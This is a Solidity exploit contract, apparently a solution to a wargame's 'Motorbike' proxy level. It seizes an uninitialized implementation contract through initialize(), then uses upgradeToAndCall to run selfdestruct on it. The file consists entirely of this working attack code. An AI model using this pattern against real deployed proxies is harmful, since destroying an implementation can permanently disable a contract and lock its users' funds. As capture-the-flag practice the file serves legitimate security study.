// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IEngine {
    function upgrader() external view returns (address);
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
    function initialize() external;
}

contract AttackMotorbike {
    function pwn(address _target) public {
        IEngine target = IEngine(_target);
        target.initialize();

        target.upgradeToAndCall(address(this), abi.encodeWithSelector(this.kill.selector));
    }

    function kill() public {
        selfdestruct(payable(address(0)));
    }
}
